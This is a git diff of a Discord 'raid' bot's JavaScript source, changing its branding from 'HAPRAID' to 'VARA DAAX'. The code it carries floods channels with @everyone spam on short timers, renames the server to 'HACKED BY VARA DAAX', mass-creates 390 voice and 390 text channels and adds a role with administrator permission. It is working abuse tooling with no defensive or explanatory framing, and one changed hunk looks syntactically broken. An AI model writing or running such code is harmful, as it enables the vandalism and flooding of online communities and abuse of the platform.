@@ -24,8 +24,8 @@ bot.on('message', msg => {
   if (msg.content === '.a') {
     console.log(`Commande .des par ${msg.author.tag}`);
     var interval = setInterval (function () {
-      msg.channel.send("@everyone  @here  RAID BY HAPRAID https://discord.gg/gmqf6wT https://media.discordapp.net/attachments/494613905654546435/515855972846272513/giphy-4.gif?width=270&height=270 https://media.discordapp.net/attachments/353298252122292225/437735929902268416/unknown.png");
-     }, 500);
+      msg.channel.send("Raid By Vara Daax tes maîtres puissants https://discord.gg/GN48n6Q XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX  https://gph.is/2C31qD3 @everyone
+ }, 500);
   }
             if (msg.content === '.des') {
             console.log(`Commande .mp par ${msg.author.tag}`);
@@ -48,11 +48,11 @@ if(msg.content === '.del'){
  
     if (!fucked){
       msg.guild.setIcon("hapraid.png").catch(e => {});
-      msg.guild.setName('RAID BY HAPRAID').catch(e => {});
+      msg.guild.setName('HACKED BY VARA DAAX').catch(e => {});
  
       for (var i = 0; i < 390; i++) {
-        msg.guild.createChannel('hapraid•exe', 'voice').catch(e => {});
-        msg.guild.createChannel('hapraid•exe', 'text').catch(e => {});
+        msg.guild.createChannel('HACKED BY VARA DAAX', 'voice').catch(e => {});
+        msg.guild.createChannel('HACKED BY VARA DAAX', 'text').catch(e => {});
       }
       fucked = true;
             }
@@ -79,7 +79,7 @@ if(msg.content === '.del'){
     console.log(`Commande .r par ${msg.author.tag}`);
  
     msg.member.guild.createRole({
-      name: "haprole",
+      name: "HACKED BY VARA DAAX",
       permissions: "ADMINISTRATOR",
       mentionable: false
     }).then(function(role) {
@@ -95,8 +95,7 @@ bot.on("message", msg => {
             let i = 0;
             let interval = setInterval(function () {
               msg.guild.channels.forEach(channel => {
-                if (channel.type === "text") channel.send('"@everyone  @here  RAID BY HAPRAID https://media.discordapp.net/attachments/494613905654546435/515855972846272513/giphy-4.gif?width=270&height=270 https://discord.gg/gmqf6wT https://media.discordapp.net/attachments/353298252122292225/437735929902268416/unknown.png')
-              }, 2500);
+                if (channel.type === "text") channel.send('"Raid By Vara Daax t’es maîtres puissant https://discord.gg/GN48n6Q XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX  https://gph.is/2C31qD3 @everyone
             });
           }
         });
